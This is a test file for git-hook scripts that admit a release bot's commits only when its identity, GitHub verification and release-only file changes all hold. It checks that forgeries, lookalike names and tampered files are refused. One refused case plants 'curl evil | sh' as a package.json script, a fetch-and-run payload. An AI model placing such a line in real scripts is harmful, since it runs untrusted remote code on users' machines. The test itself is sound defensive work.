// commit-traces admits one bot besides dependabot[bot]: the release App that Release Please commits as (board T-411: its
// release PR failed `traces` with "names an assistant or a bot other than dependabot[bot]"). The author name and address
// are only git metadata, so any pusher can write them: the identity alone admits nothing. A commit is admitted only when
// ALL of these hold: its author is exactly the App's name with its address; its committer is GitHub's web-flow; GitHub's
// own API reported it verified, by web-flow, AND as a commit of a pull request that the App itself opened on a
// release-please branch (release-commits-verified asks the API; CI hands the script the ids in COMMIT_TRACES_VERIFIED; a
// script run without it, like a local pre-push, admits no bot); and it changes nothing but release files: the root
// version of package.json and package-lock.json files (any other byte of them unchanged, so no dependency moves), the
// root entry of the release manifest, lines added to CHANGELOG.md. Real commits in a throwaway repo, the real script;
// made-up identities except the App's own, which is public.
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

const CHECKER = join(import.meta.dirname, "commit-traces");
const BOT = { name: "morndo-release[bot]", mail: "345868531+morndo-release[bot]@users.noreply.github.com" };
const ADA = { name: "Ada", mail: "ada@users.noreply.github.com" };
const WEB = { name: "GitHub", mail: "noreply@github.com" };
const OTHER_BOT = { name: "review[bot]", mail: "11111111+review[bot]@users.noreply.github.com" };
type Who = { name: string; mail: string };
type Files = Record<string, string>;

const PKG = (v: string) => `{\n  "name": "morndo",\n  "version": "${v}",\n  "private": true,\n  "scripts": { "test": "vitest run" }\n}\n`;
const LOCK = (v: string, dep = "1.3.0") => `{\n  "name": "morndo",\n  "version": "${v}",\n  "packages": {\n    "": {\n      "name": "morndo",\n      "version": "${v}"\n    },\n    "node_modules/left-pad": {\n      "version": "${dep}"\n    }\n  }\n}\n`;
const MANIFEST = (v: string) => `{\n  ".": "${v}"\n}\n`;
const CHANGELOG = (more = "") => `# Changelog\n${more}`;
// What Release Please's release commit changes: exactly these four files.
const RELEASE: Files = {
  "package.json": PKG("0.1.0"), "package-lock.json": LOCK("0.1.0"), ".release-please-manifest.json": MANIFEST("0.1.0"),
  "CHANGELOG.md": CHANGELOG("\n## 0.1.0 (2026-10-23)\n\n### Features\n\n* the first release\n"),
};

let repo: string;
let verified: string;
let root: string;                       // the base commit: every check starts from it, so one case never builds on another's changes
beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), "traces-"));
  verified = join(repo, "..", `verified-${Math.random().toString(36).slice(2)}`);
  git(["init", "-q"]);
  write({ "package.json": PKG("0.0.0"), "package-lock.json": LOCK("0.0.0"), ".release-please-manifest.json": MANIFEST("0.0.0"), "CHANGELOG.md": CHANGELOG(), "apps/hub/package.json": PKG("0.0.0"), "src/a.ts": "export const a = 1;\n" });
  root = commit(ADA, ADA, "chore: base");
});
afterEach(() => { rmSync(repo, { recursive: true, force: true }); rmSync(verified, { force: true }); });

function git(args: string[], env: Record<string, string> = {}) {
  const r = spawnSync("git", args, { cwd: repo, encoding: "utf8", env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null", ...env } });
  if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
  return r.stdout.trim();
}
function write(files: Files) {
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(repo, path)), { recursive: true });
    writeFileSync(join(repo, path), text);
  }
  git(["add", "-A"]);
}
function commit(author: Who, committer: Who, message: string) {
  git(["commit", "-q", "--allow-empty", "-m", message], {
    GIT_AUTHOR_NAME: author.name, GIT_AUTHOR_EMAIL: author.mail, GIT_COMMITTER_NAME: committer.name, GIT_COMMITTER_EMAIL: committer.mail,
  });
  return git(["rev-parse", "HEAD"]);
}
type Opts = { files?: Files; message?: string; listed?: "yes" | "no" | string[]; env?: Record<string, string> };
// A new commit judged by range and by mails, as CI and the pre-push hook do. `listed`: the ids GitHub is said to report as
// verified (the new commit's own by default).
function check(author: Who, committer: Who, o: Opts = {}) {
  git(["reset", "-q", "--hard", root]);
  const base = root;
  write(o.files ?? RELEASE);
  const sha = commit(author, committer, o.message ?? "chore(main): release 0.1.0");
  const listed = o.listed ?? "yes";
  const env: Record<string, string> = { ...(o.env ?? {}) };
  if (listed !== "no") { writeFileSync(verified, (Array.isArray(listed) ? listed : [sha]).join("\n") + "\n"); env.COMMIT_TRACES_VERIFIED = verified; }
  const run = (mode: "range" | "mails") => spawnSync("sh", [CHECKER, mode, `${base}..HEAD`], { cwd: repo, encoding: "utf8", env: { ...process.env, ...env } });
  return { sha, range: run("range"), mails: run("mails") };
}
const passes = (author: Who, committer: Who, o?: Opts) => {
  const r = check(author, committer, o);
  return [r.range.status, r.mails.status, r.range.stderr];
};
const refused = (author: Who, committer: Who, o?: Opts) => {
  const r = check(author, committer, o);
  expect(r.range.status, r.range.stderr).toBe(1);
  return r.range.stderr;
};

describe("commit-traces and the release App: what is admitted", () => {
  it("passes the App's own release commit: its identity, GitHub as committer, listed as verified, release files only", () => {
    expect(passes(BOT, WEB)).toEqual([0, 0, ""]);
  });

  it("still passes dependabot[bot], with no list and no restriction on content", () => {
    expect(passes({ name: "dependabot[bot]", mail: "49699333+dependabot[bot]@users.noreply.github.com" }, WEB, { listed: "no", files: { "src/a.ts": "export const a = 2;\n" } })).toEqual([0, 0, ""]);
  });

  it("the release files may be a subset, and a nested package.json's version may move too", () => {
    expect(passes(BOT, WEB, { files: { "package.json": PKG("0.1.0") } })).toEqual([0, 0, ""]);
    expect(passes(BOT, WEB, { files: { "apps/hub/package.json": PKG("0.1.0") } })).toEqual([0, 0, ""]);
  });
});

describe("a forged identity is not admitted", () => {
  it("refuses the App's identity on a commit GitHub did not report verified: not listed, no list at all, an empty or other list", () => {
    refused(BOT, WEB, { listed: "no" });
    refused(BOT, WEB, { listed: [] });
    refused(BOT, WEB, { listed: ["0123456789abcdef0123456789abcdef01234567"] });
    refused(BOT, WEB, { env: { COMMIT_TRACES_VERIFIED: "/nonexistent/file" }, listed: "no" });
  });

  it("matches the listed id whole: a prefix, a suffix and a longer line do not count", () => {
    const sha = (() => { const r = check(BOT, WEB, { listed: "no" }); return r.sha; })();
    for (const line of [sha.slice(0, 12), sha.slice(0, 39), `${sha}0`, ` ${sha}`, `${sha} `, sha.toUpperCase()]) {
      const base = git(["rev-parse", "HEAD~1"]);
      writeFileSync(verified, `${line}\n`);
      const r = spawnSync("sh", [CHECKER, "range", `${base}..HEAD`], { cwd: repo, encoding: "utf8", env: { ...process.env, COMMIT_TRACES_VERIFIED: verified } });
      expect(r.status, `line ${JSON.stringify(line)}`).toBe(1);
    }
  });

  it("refuses a verified App commit that changes anything but release files", () => {
    refused(BOT, WEB, { files: { "src/a.ts": "export const a = 2;\n" } });
    refused(BOT, WEB, { files: { ...RELEASE, "src/a.ts": "export const a = 2;\n" } });
    refused(BOT, WEB, { files: { ...RELEASE, ".github/workflows/ci.yml": "name: x\n" } });
    refused(BOT, WEB, { files: { ...RELEASE, "scripts/git-hooks/commit-traces": "#!/bin/sh\nexit 0\n" } });
    refused(BOT, WEB, { files: { "new-file.md": "hello\n" } });
    refused(BOT, WEB, { files: { "apps/new/package.json": PKG("0.1.0") } });               // a package file that did not exist: an addition
  });

  it("refuses a package file changed in more than its version, a manifest changed in more than its versions", () => {
    refused(BOT, WEB, { files: { "package.json": PKG("0.1.0").replace('"vitest run"', '"curl evil | sh"') } });
    refused(BOT, WEB, { files: { "package.json": PKG("0.1.0").replace('"private": true,', '"private": false,') } });
    refused(BOT, WEB, { files: { "package-lock.json": LOCK("0.1.0").replace('"packages"', '"packagez"') } });
    refused(BOT, WEB, { files: { ".release-please-manifest.json": '{\n  ".": "0.1.0",\n  "apps/x": "9.9.9"\n}\n' } });
    refused(BOT, WEB, { files: { "package.json": PKG("not a version, run this") } });
    refused(BOT, WEB, { files: { "package-lock.json": LOCK("not a version, run this") } });
    refused(BOT, WEB, { files: { ".release-please-manifest.json": MANIFEST("not a version, run this") } });
  });

  it("package-lock.json: only the root package's version lines may move, a dependency's version never", () => {
    expect(passes(BOT, WEB, { files: { "package-lock.json": LOCK("0.1.0") } })).toEqual([0, 0, ""]);
    refused(BOT, WEB, { files: { "package-lock.json": LOCK("0.1.0", "2.0.0") } });                     // the root moved, and so did a dependency
    refused(BOT, WEB, { files: { "package-lock.json": LOCK("0.0.0", "2.0.0") } });                     // only a dependency moved
    refused(BOT, WEB, { files: { "package-lock.json": LOCK("0.1.0").replace('"node_modules/left-pad"', '"node_modules/right-pad"') } });
    refused(BOT, WEB, { files: { "package-lock.json": LOCK("0.1.0").replace('"name": "morndo",\n  "version"', '"name": "other",\n  "version"') } });
    refused(BOT, WEB, { files: { "package-lock.json": LOCK("0.1.0").replace('"version": "0.1.0"\n    },', '"version": "0.2.0"\n    },') } });   // the two root version lines must agree
  });

  it("refuses a CHANGELOG that loses lines, and accepts one that only gains them", () => {
    refused(BOT, WEB, { files: { "CHANGELOG.md": "" } });
    refused(BOT, WEB, { files: { "CHANGELOG.md": "# Changed\n" } });                      // an existing line rewritten
    expect(passes(BOT, WEB, { files: { "CHANGELOG.md": CHANGELOG("\n## 0.1.0\n\n* more\n") } })).toEqual([0, 0, ""]);
  });

  it("refuses a deleted, renamed or mode-changed release file, and an empty commit", () => {
    const base = git(["rev-parse", "HEAD"]);
    git(["rm", "-q", "CHANGELOG.md"]);
    const del = commit(BOT, WEB, "chore(main): release 0.1.0");
    writeFileSync(verified, `${del}\n`);
    const run = (r: string) => spawnSync("sh", [CHECKER, "range", r], { cwd: repo, encoding: "utf8", env: { ...process.env, COMMIT_TRACES_VERIFIED: verified } });
    expect(run(`${base}..HEAD`).status).toBe(1);
    git(["reset", "-q", "--hard", base]);
    git(["mv", "CHANGELOG.md", "OLD.md"]);
    const mv = commit(BOT, WEB, "chore(main): release 0.1.0");
    writeFileSync(verified, `${mv}\n`);
    expect(run(`${base}..HEAD`).status).toBe(1);
    git(["reset", "-q", "--hard", base]);
    git(["update-index", "--chmod=+x", "package.json"]);
    const chmod = commit(BOT, WEB, "chore(main): release 0.1.0");
    writeFileSync(verified, `${chmod}\n`);
    expect(run(`${base}..HEAD`).status).toBe(1);
    git(["reset", "-q", "--hard", base]);
    const empty = commit(BOT, WEB, "chore(main): release 0.1.0");
    writeFileSync(verified, `${empty}\n`);
    expect(run(`${base}..HEAD`).status).toBe(1);
  });

  it("refuses an App commit whose committer is not GitHub's web-flow, even listed and clean", () => {
    refused(BOT, ADA);
    refused(BOT, BOT);
    refused(BOT, OTHER_BOT);
    refused(BOT, { name: "GitHub", mail: "ada@users.noreply.github.com" });
    refused(BOT, { name: "Github", mail: "noreply@github.com" });
  });

  it("refuses another bot, listed as verified and on release files", () => {
    refused(OTHER_BOT, WEB);
    refused({ name: "renovate[bot]", mail: "29139614+renovate[bot]@users.noreply.github.com" }, WEB);
  });

  it("refuses lookalikes of the App's identity, listed and on release files", () => {
    refused({ name: BOT.name, mail: "11111111+morndo-release[bot]@users.noreply.github.com" }, WEB);   // another id
    refused({ name: BOT.name, mail: ADA.mail }, WEB);
    refused({ name: "Ada", mail: BOT.mail }, WEB);
    refused({ name: "x morndo-release[bot]", mail: BOT.mail }, WEB);
    refused({ name: BOT.name, mail: `x${BOT.mail}` }, WEB);
    refused({ name: "Morndo-Release[bot]", mail: BOT.mail }, WEB);
    refused({ name: "morndo-release[bot]-two", mail: BOT.mail }, WEB);
    // (a trailing space is not a lookalike: git trims it from the name it records, so it is the App's name)
  });

  it("refuses every assistant name, as author or committer, even beside the App's identity and listed", () => {
    for (const name of ["Claude", "claude[bot]", "Anthropic", "Cursor Agent", "Codex", "Copilot", "copilot-swe-agent", "GPT", "Gemini", "GLM"]) {
      refused({ name, mail: ADA.mail }, WEB);
      refused(ADA, { name, mail: ADA.mail });
      refused(BOT, { name, mail: ADA.mail });
    }
  });

  it("still judges the App's message: an assistant trailer or a generated-with line fails", () => {
    refused(BOT, WEB, { message: "chore(main): release 0.1.0\n\nCo-authored-by: Claude <a@example.invalid>" });
    refused(BOT, WEB, { message: "chore(main): release 0.1.0\n\nGenerated with Example" });
    refused(BOT, WEB, { message: "chore(main): release 0.1.0\n\nCo-authored-by: review[bot] <b@example.invalid>" });
  });

  it("still refuses the App's identity with an address that is not a noreply address", () => {
    const r = check({ name: BOT.name, mail: "bot@example.invalid" }, WEB);
    expect(r.range.status).toBe(1);
    expect(r.mails.status).toBe(1);
  });

  it("a merge commit by the App is not a release commit", () => {
    const base = git(["rev-parse", "HEAD"]);
    git(["checkout", "-q", "-b", "side"]);
    write({ "package.json": PKG("0.1.0") });                  // a release-file change, so only the single-parent rule can refuse the merge
    commit(ADA, ADA, "fix: side");
    git(["checkout", "-q", "-"]);
    git(["merge", "-q", "--no-ff", "-m", "chore(main): release 0.1.0", "side"], { GIT_AUTHOR_NAME: BOT.name, GIT_AUTHOR_EMAIL: BOT.mail, GIT_COMMITTER_NAME: WEB.name, GIT_COMMITTER_EMAIL: WEB.mail });
    const merge = git(["rev-parse", "HEAD"]);
    writeFileSync(verified, `${merge}\n`);
    const r = spawnSync("sh", [CHECKER, "range", `${base}..HEAD`], { cwd: repo, encoding: "utf8", env: { ...process.env, COMMIT_TRACES_VERIFIED: verified } });
    expect(r.status).toBe(1);
  });

  it("judges the App's commit among others: a bad commit next to it is still named", () => {
    const base = git(["rev-parse", "HEAD"]);
    write(RELEASE);
    const good = commit(BOT, WEB, "chore(main): release 0.1.0");
    write({ "src/a.ts": "export const a = 3;\n" });
    const bad = commit(OTHER_BOT, WEB, "fix: note");
    writeFileSync(verified, `${good}\n${bad}\n`);
    const r = spawnSync("sh", [CHECKER, "range", `${base}..HEAD`], { cwd: repo, encoding: "utf8", env: { ...process.env, COMMIT_TRACES_VERIFIED: verified } });
    expect(r.status).toBe(1);
    expect(r.stderr).toContain(bad);
  });
});

// release-commits-verified: which commits of a range GitHub vouches for as the release App's. It asks the commit API
// (verified, by web-flow) and the pull requests of the commit (one the App itself opened, on a release-please branch of
// this repository), only for commits whose author looks like the App. A fake `gh` answers from canned JSON, so the
// script's own jq conditions run for real.
describe("release-commits-verified", () => {
  const LISTER = join(import.meta.dirname, "release-commits-verified");
  const REPO = "morndo/morndo";
  const GOOD_COMMIT = { commit: { verification: { verified: true, reason: "valid" } }, committer: { login: "web-flow" } };
  const GOOD_PR = { number: 99, user: { login: "morndo-release[bot]", type: "Bot" }, head: { ref: "release-please--branches--main--components--morndo", repo: { full_name: REPO } } };
  let bin: string;
  beforeEach(() => {
    bin = mkdtempSync(join(tmpdir(), "fakegh-"));
    writeFileSync(join(bin, "gh"), `#!/bin/sh\nprintf '%s\\n' "$*" >> "$FAKE_GH_LOG"\ncase "$2" in\n  */pulls) [ -f "$FAKE_GH_PULLS" ] && cat "$FAKE_GH_PULLS" || exit 1 ;;\n  *) [ -f "$FAKE_GH_COMMIT" ] && cat "$FAKE_GH_COMMIT" || exit 1 ;;\nesac\n`, { mode: 0o755 });
  });
  afterEach(() => { rmSync(bin, { recursive: true, force: true }); });

  // The range holds one commit by the App's identity and one by Ada; the API is told `commit` and `pulls` (undefined: the call fails).
  function list(commit: unknown, pulls: unknown, who: Who = BOT) {
    const base = git(["rev-parse", "HEAD"]);
    const mine = commit_(ADA, WEB, "fix: other", { "src/a.ts": "export const a = 5;\n" });
    const app = commit_(who, WEB, "chore(main): release 0.1.0", RELEASE);
    const files = { c: join(bin, "commit.json"), p: join(bin, "pulls.json"), log: join(bin, "calls.log") };
    rmSync(files.c, { force: true });                      // a call that "fails" has no canned answer; none is left from the last list()
    rmSync(files.p, { force: true });
    writeFileSync(files.log, "");
    if (commit !== undefined) writeFileSync(files.c, JSON.stringify(commit));
    if (pulls !== undefined) writeFileSync(files.p, JSON.stringify(pulls));
    const r = spawnSync("sh", [LISTER, `${base}..HEAD`], { cwd: repo, encoding: "utf8", env: { ...process.env, PATH: `${bin}:${process.env.PATH ?? ""}`, REPO, FAKE_GH_COMMIT: files.c, FAKE_GH_PULLS: files.p, FAKE_GH_LOG: files.log } });
    return { listed: r.stdout.split("\n").filter(Boolean), app, mine, status: r.status, calls: readFileSync(files.log, "utf8").split("\n").filter(Boolean) };
  }
  function commit_(author: Who, committer: Who, message: string, files: Files) { write(files); return commit(author, committer, message); }

  it("lists the App's commit when the API says verified by web-flow and a pull request of the App's on a release-please branch holds it", () => {
    const r = list(GOOD_COMMIT, [GOOD_PR]);
    expect(r.listed).toEqual([r.app]);
    expect(r.status).toBe(0);
  });

  it("asks the API only about commits whose author looks like the App, twice each, for this repository", () => {
    const r = list(GOOD_COMMIT, [GOOD_PR]);
    expect(r.calls).toEqual([`api repos/${REPO}/commits/${r.app}`, `api repos/${REPO}/commits/${r.app}/pulls`]);
  });

  it("lists nothing for a commit GitHub does not call verified, or signed by anyone but web-flow", () => {
    expect(list({ commit: { verification: { verified: false, reason: "unsigned" } }, committer: { login: "web-flow" } }, [GOOD_PR]).listed).toEqual([]);
    expect(list({ commit: { verification: { verified: true } }, committer: { login: "ada-dev" } }, [GOOD_PR]).listed).toEqual([]);
    expect(list({ commit: { verification: { verified: "true" } }, committer: { login: "web-flow" } }, [GOOD_PR]).listed).toEqual([]);
    expect(list({ commit: {}, committer: { login: "web-flow" } }, [GOOD_PR]).listed).toEqual([]);
    expect(list({ message: "No commit found for SHA", status: "422" }, [GOOD_PR]).listed).toEqual([]);
  });

  it("lists nothing when the commit is in no pull request, or none of them is the App's", () => {
    expect(list(GOOD_COMMIT, []).listed).toEqual([]);
    expect(list(GOOD_COMMIT, [{ ...GOOD_PR, user: { login: "ada-dev", type: "User" } }]).listed).toEqual([]);                    // a lane's own PR on a release-please branch
    expect(list(GOOD_COMMIT, [{ ...GOOD_PR, user: { login: "morndo-release[bot]", type: "User" } }]).listed).toEqual([]);          // the name without being a Bot
    expect(list(GOOD_COMMIT, [{ ...GOOD_PR, user: { login: "dependabot[bot]", type: "Bot" } }]).listed).toEqual([]);              // another bot
    expect(list(GOOD_COMMIT, [{ ...GOOD_PR, user: { login: "x-morndo-release[bot]", type: "Bot" } }]).listed).toEqual([]);
  });

  it("lists nothing when the App's pull request is not on a release-please branch of this repository", () => {
    expect(list(GOOD_COMMIT, [{ ...GOOD_PR, head: { ref: "feat/anything", repo: { full_name: REPO } } }]).listed).toEqual([]);
    expect(list(GOOD_COMMIT, [{ ...GOOD_PR, head: { ref: "not-release-please--x", repo: { full_name: REPO } } }]).listed).toEqual([]);
    expect(list(GOOD_COMMIT, [{ ...GOOD_PR, head: { ref: GOOD_PR.head.ref, repo: { full_name: "someone/morndo" } } }]).listed).toEqual([]);   // a fork
    expect(list(GOOD_COMMIT, [{ ...GOOD_PR, head: { ref: GOOD_PR.head.ref, repo: null } }]).listed).toEqual([]);                         // a deleted fork
  });

  it("lists the commit when any one of several pull requests is the App's", () => {
    const lane = { ...GOOD_PR, number: 7, user: { login: "ada-dev", type: "User" } };
    expect(list(GOOD_COMMIT, [lane, GOOD_PR]).listed).toHaveLength(1);
  });

  it("lists nothing when an API call fails, and never lists a commit of another author", () => {
    expect(list(undefined, [GOOD_PR]).listed).toEqual([]);
    expect(list(GOOD_COMMIT, undefined).listed).toEqual([]);
    const r = list(GOOD_COMMIT, [GOOD_PR], ADA);
    expect(r.listed).toEqual([]);
    expect(r.calls).toEqual([]);
  });

  it("needs REPO", () => {
    const r = spawnSync("sh", [LISTER, "HEAD"], { cwd: repo, encoding: "utf8", env: { ...process.env, REPO: "" } });
    expect(r.status).not.toBe(0);
  });
});

describe("the traces workflow hands the script the list release-commits-verified makes", () => {
  const workflow = readFileSync(join(import.meta.dirname, "..", "..", ".github", "workflows", "commit-traces.yml"), "utf8");

  it("builds the list with that script over the range, gives the token and repository, and passes the file in both events", () => {
    expect(workflow).toContain("scripts/git-hooks/release-commits-verified");
    expect(workflow).toContain("COMMIT_TRACES_VERIFIED");
    expect(workflow).toContain("GH_TOKEN: ${{ github.token }}");
    expect(workflow).toContain("REPO: ${{ github.repository }}");
    expect(workflow).toMatch(/permissions:\n  contents: read\n  pull-requests: read\n/);
    // one place builds the range, so the list and the check can not disagree about it
    expect(workflow.match(/commit-traces range/g)).toHaveLength(1);
    expect(workflow.match(/release-commits-verified/g)).toHaveLength(2);   // the comment and the call
  });
});
